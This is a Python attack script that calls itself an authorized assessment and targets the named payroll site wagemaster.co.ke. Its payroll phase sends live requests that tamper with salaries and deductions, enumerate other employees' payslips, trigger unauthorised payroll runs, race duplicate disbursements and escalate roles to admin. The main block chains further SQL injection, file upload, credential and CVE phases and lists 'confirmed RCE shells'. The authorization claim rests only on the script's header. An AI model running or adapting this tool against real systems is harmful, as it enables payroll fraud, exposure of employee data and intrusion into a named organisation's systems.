#!/usr/bin/env python3
"""
wagemaster.co.ke — Authorized Security Assessment
Engagement : Cyberdeck Consultants
LOA Ref    : wagemaster.co.ke/CTO/LOA/2026/012
Auth by    : Kelvin Rotich, CTO — wagemaster.co.ke
Run        : pip install requests && python3 sweep_wagemaster.py
"""

import sys, os, time, threading
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# ── Patch sweep module config before any phase runs ───────────────────────────
import sweep as _s

_s.TARGET      = "https://wagemaster.co.ke"
_s.BASE_DOMAIN = "wagemaster.co.ke"
_s.EMAIL       = "testuser@wagemaster.co.ke"   # replace with valid test account
_s.PASSWORD    = "TestPass123!"                # replace with valid test password
_s.REPORT_OUT  = "wagemaster_report.html"
_s.SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36",
    "Accept": "application/json, text/html, */*",
})

safe_get  = _s.safe_get
safe_post = _s.safe_post
finding   = _s.finding
info      = _s.info
warn      = _s.warn
crit      = _s.crit
ok        = _s.ok
url       = _s.url


# ── PHASE 15: PAYROLL / FINANCIAL LOGIC ───────────────────────────────────────
def phase_payroll_logic():
    info("=" * 60)
    info("PHASE 15 — PAYROLL & FINANCIAL LOGIC FLAWS")
    info("=" * 60)

    # ── Salary manipulation via parameter tampering ───────────────────────────
    info("Testing salary / payroll record tampering...")
    tamper_payloads = [
        {"salary": 9999999,  "employee_id": 1},
        {"gross_pay": 9999999},
        {"net_pay": 9999999, "deductions": 0},
        {"tax": 0, "nhif": 0, "nssf": 0},
        {"allowances": 9999999},
        {"basic_salary": 9999999, "is_active": True},
        {"overtime": 9999999},
    ]
    payroll_endpoints = [
        "/api/payroll", "/api/payroll/run", "/api/payroll/process",
        "/api/salary", "/api/employees", "/api/employees/update",
        "/api/payslip", "/api/payslips",
        "/api/admin/payroll", "/api/hr/payroll",
    ]
    for endpoint in payroll_endpoints:
        for payload in tamper_payloads[:3]:
            r = safe_post(endpoint, json=payload)
            if r and r.status_code in (200, 201):
                try:
                    d = r.json()
                    if any(k in str(d) for k in ["salary", "pay", "gross", "net"]):
                        finding("CRITICAL", f"Payroll parameter tampering accepted at {endpoint}",
                                f"Payload {payload} returned HTTP 200 with payroll data.",
                                r.text[:400])
                        crit(f"  PAYROLL TAMPER: {endpoint}")
                except Exception:
                    pass

    # ── Negative deduction / negative tax abuse ───────────────────────────────
    info("Testing negative deduction abuse (net pay inflation)...")
    neg_payloads = [
        {"tax_deduction": -99999},
        {"nhif_deduction": -99999},
        {"nssf_deduction": -99999},
        {"loan_deduction": -99999},
        {"advance_deduction": -99999},
    ]
    for endpoint in payroll_endpoints[:5]:
        for payload in neg_payloads:
            r = safe_post(endpoint, json=payload)
            if r and r.status_code in (200, 201):
                finding("HIGH", f"Negative deduction accepted at {endpoint}",
                        f"Payload {payload} may inflate net pay fraudulently.",
                        r.text[:300])

    # ── IDOR on payslips / employee records ───────────────────────────────────
    info("Testing IDOR on payslips and employee records...")
    idor_templates = [
        "/api/payslip/{id}", "/api/payslips/{id}",
        "/api/employees/{id}", "/api/employees/{id}/salary",
        "/api/payroll/{id}", "/api/payroll/run/{id}",
        "/api/leave/{id}", "/api/advances/{id}",
        "/api/loans/{id}", "/api/deductions/{id}",
    ]
    for tmpl in idor_templates:
        for id_val in [1, 2, 3, 10, 100]:
            path = tmpl.replace("{id}", str(id_val))
            r = safe_get(path)
            if r and r.status_code == 200 and len(r.text) > 80:
                try:
                    d = r.json()
                    uid = (d.get("employee_id") or d.get("user_id") or
                           d.get("owner_id") or d.get("created_by"))
                    if uid:
                        finding("HIGH", f"IDOR — payroll record accessible at {path}",
                                f"Record owned by employee_id={uid} accessible without ownership check.",
                                r.text[:400])
                        crit(f"  PAYROLL IDOR: {path}")
                except Exception:
                    pass

    # ── Unauthorised payroll run ───────────────────────────────────────────────
    info("Testing unauthorised payroll run trigger...")
    run_endpoints = [
        "/api/payroll/run", "/api/payroll/process", "/api/payroll/approve",
        "/api/payroll/finalize", "/api/payroll/disburse",
    ]
    for endpoint in run_endpoints:
        r = safe_post(endpoint, json={"month": "2026-10", "confirm": True})
        if r and r.status_code in (200, 201):
            finding("CRITICAL", f"Unauthorised payroll run accepted at {endpoint}",
                    "Non-admin account triggered payroll processing.",
                    r.text[:400])
            crit(f"  UNAUTH PAYROLL RUN: {endpoint}")

    # ── Duplicate payment / race condition ────────────────────────────────────
    info("Testing duplicate payroll disbursement via race condition (8 threads)...")
    barrier = threading.Barrier(8)
    race_results = []

    def race_pay():
        try:
            barrier.wait(timeout=5)
        except threading.BrokenBarrierError:
            return
        r = safe_post("/api/payroll/disburse", json={
            "employee_id": 1, "amount": 1, "month": "2026-10"
        })
        if r:
            race_results.append(r.status_code)

    threads = [threading.Thread(target=race_pay) for _ in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)

    successes = race_results.count(200) + race_results.count(201)
    if successes > 1:
        finding("HIGH", f"Race condition — {successes}/8 concurrent disbursements accepted",
                "May allow duplicate salary payment.",
                f"Status codes: {race_results}")

    # ── Leave / advance balance abuse ─────────────────────────────────────────
    info("Testing leave days and loan/advance limit bypass...")
    for endpoint, payload in [
        ("/api/leave/apply",    {"days": 999, "type": "annual"}),
        ("/api/advances/apply", {"amount": 9999999, "reason": "test"}),
        ("/api/loans/apply",    {"amount": 9999999, "duration_months": 1}),
    ]:
        r = safe_post(endpoint, json=payload)
        if r and r.status_code in (200, 201):
            finding("HIGH", f"No upper-bound validation at {endpoint}",
                    f"Payload {payload} accepted without rejection.",
                    r.text[:300])

    # ── Mass assignment on employee tier / role ───────────────────────────────
    info("Testing mass assignment on employee profile (role escalation)...")
    for endpoint in ["/api/profile", "/api/employees/update", "/api/user"]:
        for payload in [
            {"role": "admin", "is_admin": True},
            {"department": "Finance", "can_approve_payroll": True},
            {"permission_level": 99},
        ]:
            r = safe_post(endpoint, json=payload)
            if r and r.status_code in (200, 201):
                try:
                    d = r.json()
                    if d.get("role") == "admin" or d.get("is_admin"):
                        finding("CRITICAL", f"Mass assignment privilege escalation at {endpoint}",
                                "Role set to admin via mass assignment.",
                                r.text[:300])
                except Exception:
                    pass

    ok("Payroll logic phase complete.")


# ── MAIN ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\033[92m" + "=" * 60)
    print("  WAGEMASTER SECURITY ASSESSMENT — v1")
    print("  Target : wagemaster.co.ke")
    print("  Phases : 15 (Base 14 + Payroll Logic)")
    print("  Auth   : Cyberdeck Consultants")
    print("  LOA    : wagemaster.co.ke/CTO/LOA/2026/012")
    print("=" * 60 + "\033[0m")

    _s.phase_recon()
    _s.phase_auth()
    _s.phase_surface_map()
    _s.phase_sqli()
    _s.phase_file_upload()
    _s.phase_idor()
    _s.phase_credentials()
    _s.phase_logic()
    _s.phase_web()
    _s.phase_subdomains()
    _s.phase_cve()
    _s.phase_advanced_injection()
    _s.phase_infrastructure()
    _s.phase_business_logic_advanced()
    phase_payroll_logic()
    _s.generate_report()

    print("\n\033[92m" + "=" * 60)
    print(f"  SWEEP COMPLETE — {len(_s.FINDINGS)} findings")
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    for f in sorted(_s.FINDINGS, key=lambda x: sev_order.get(x["severity"], 5)):
        c = {"CRITICAL": "\033[91m", "HIGH": "\033[91m",
             "MEDIUM": "\033[93m"}.get(f["severity"], "\033[0m")
        print(f"  {c}[{f['severity']}]\033[0m {f['title']}")
    print(f"\n  Report: {_s.REPORT_OUT}")
    rce = _s.RECON.get("rce_paths", [])
    if rce:
        print("\033[91m\n  *** CONFIRMED RCE SHELLS ***")
        for p in rce:
            print(f"  {p}")
        print("\033[0m")
    print("=" * 60 + "\033[0m")
